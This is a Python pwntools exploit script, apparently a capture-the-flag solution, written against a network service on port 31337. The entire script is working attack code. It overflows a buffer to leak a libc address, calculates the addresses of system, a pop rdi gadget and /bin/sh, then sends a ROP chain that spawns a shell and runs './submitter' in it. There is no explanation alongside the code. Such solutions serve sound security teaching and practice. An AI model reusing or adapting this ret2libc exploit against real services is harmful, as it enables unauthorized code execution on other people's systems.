#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
context.bits = 64
# context.log_level = "debug"

HOST = os.environ.get("HOST", "localhost")
PORT = 31337

while True:
    r = remote(HOST, int(PORT))

    r.sendlineafter(b"?", b"10")
    r.sendlineafter(b"?", b"3")

    def guess_start(idx):
        return 0x30 + 1 + 10 * idx + 1

    payload1 = flat({9: 0xFF, 0xA8 - guess_start(1): b"\xf1"})

    overflow_size = 0xF0
    r.sendlineafter(b"?", bytes([overflow_size] * 10))
    r.sendlineafter(b"?", payload1)

    leak = b""

    for i in range(0xF0):
        r.recvuntil(b"\x1b[")
        r.recvuntil(b"m ")
        leak += r.recvn(1)

    # print(hexdump(leak))

    libc_base = u64(leak[0xE6 : 0xE6 + 8]) - 2515008
    system = libc_base + 0x50D70 - 16
    pop_rdi_ret = libc_base + 0x000000000002A3E5
    bin_sh = libc_base + 0x1D8698

    print(f"libc_base: {hex(libc_base)}")

    payload2 = flat(
        {
            guess_start(6) - guess_start(2) - 1: b"\x00",
            guess_start(5) - guess_start(2) - 1: b"\x00",
            guess_start(4) - guess_start(2) - 1: b"\x00",
            guess_start(3) - guess_start(2) - 1: b"\x00",
            0xA8 - guess_start(2): p32(0xA8 - guess_start(2)),
            0xAC - guess_start(2): p32(2),
            0xC8 - guess_start(2): [pop_rdi_ret + 1, pop_rdi_ret, bin_sh, system],
        },
        length=0xFF,
    )

    if b"\n" in payload2 or b"\t" in payload2 or b" " in payload2:
        continue
    assert b" " not in payload2
    assert b"\n" not in payload2
    assert b"\t" not in payload2

    r.sendlineafter(b"?", payload2)

    try:
        r.sendlineafter(b"correct", b"./submitter; exit", timeout=2)
    except:
        continue
    print(r.recvall())
    break
